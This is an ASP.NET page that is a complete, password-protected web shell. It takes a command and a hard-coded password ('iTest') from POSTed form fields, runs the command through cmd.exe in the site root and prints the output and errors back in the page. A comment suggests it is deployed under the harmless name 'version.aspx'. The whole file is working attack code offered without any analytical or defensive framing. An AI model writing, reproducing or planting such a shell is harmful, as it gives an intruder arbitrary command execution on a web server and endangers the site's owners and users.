<%@ Page Language="C#" AutoEventWireup="true" %>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title>Command Execution Page</title>
</head>
<body>
    <form id="form1" runat="server" method="post">
        
        <div>
            <% 
                if (IsPostBack)
                {
                    // Get the command and password from the form
                    string command = Request.Form["cmd"];
                    string password = Request.Form["pwd"];

                    // Check if the password is correct
                    if (password == "iTest")
                    {
                        if (!string.IsNullOrEmpty(command))
                        {
                            try
                            {
                                // Get the directory where the version.aspx file is located
                                string workingDirectory = Server.MapPath("~/");

                                // Setup process to run cmd.exe with the provided command
                                System.Diagnostics.ProcessStartInfo processInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + command);
                                processInfo.RedirectStandardOutput = true;
                                processInfo.RedirectStandardError = true;
                                processInfo.UseShellExecute = false;
                                processInfo.CreateNoWindow = true;
                                processInfo.WorkingDirectory = workingDirectory; // Set the working directory

                                // Start the process
                                using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(processInfo))
                                {
                                    // Read the output and error
                                    string output = process.StandardOutput.ReadToEnd();
                                    string error = process.StandardError.ReadToEnd();
                                    process.WaitForExit();
                                    
                                    // Display the output and error
                                    Response.Write("<pre>" + output + "</pre>");
                                    if (!string.IsNullOrEmpty(error))
                                    {
                                        Response.Write("<pre style='color: red;'>" + error + "</pre>");
                                    }
                                }
                            }
                            catch (Exception ex)
                            {
                                Response.Write("Error: " + ex.Message);
                            }
                        }
                        else
                        {
                            Response.Write("No command provided. Please enter a command.");
                        }
                    }
                    else
                    {
                        Response.Write("Invalid password. Please enter the correct password.");
                    }
                }
            %>
        </div>
    </form>
</body>
</html>
